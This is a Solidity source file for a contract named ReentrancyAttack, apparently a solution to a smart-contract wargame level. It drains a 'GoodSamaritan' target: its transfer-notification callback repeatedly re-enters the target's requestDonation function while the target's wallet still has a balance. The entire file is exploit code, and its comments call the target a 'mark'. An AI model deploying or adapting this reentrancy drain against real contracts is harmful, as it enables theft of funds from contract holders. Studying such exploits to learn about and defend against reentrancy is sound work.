// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./INotifyable.sol";
import "./GoodSamaritan.sol";
import "./Coin.sol";
import "./Wallet.sol";

/**
 * The attack contract. 
 */
contract ReentrancyAttack is INotifyable {
    address markAddr; 
    
    error NotEnoughBalance();
    
    /**
     * @dev This will be called automatically from Coin's transfer method. 
     */
    function notify(uint256 /*amount*/) external override {
        //the 'mark' 
        GoodSamaritan mark = GoodSamaritan(markAddr);
        Coin coin = Coin(msg.sender);
        Wallet wallet = mark.wallet();
            
        //if there is a positive balance, reenter the call stack
        if (coin.balances(address(wallet)) > 0) {
            mark.requestDonation();
        }
    }
    
    /**
     * @dev Publicly call this function from the front end to start off the attack. 
     * @param _mark Pass the address of the GoodSamaritan contract that is the target of attack.
     */
    function attack(address _mark) external {
        GoodSamaritan mark = GoodSamaritan(_mark);
        markAddr = _mark;
        
        //request a donation from the mark 
        mark.requestDonation();
    }
}
